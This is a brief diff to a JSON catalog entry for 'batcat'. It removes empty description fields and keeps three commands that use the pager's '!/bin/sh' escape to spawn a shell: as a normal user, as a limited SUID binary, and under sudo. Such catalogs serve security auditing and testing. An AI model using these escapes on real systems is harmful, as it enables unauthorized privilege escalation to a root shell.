@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "batcat --paging always /etc/profile\n!/bin/sh\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./batcat --paging always /etc/profile\n!/bin/sh\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
       }
     ]
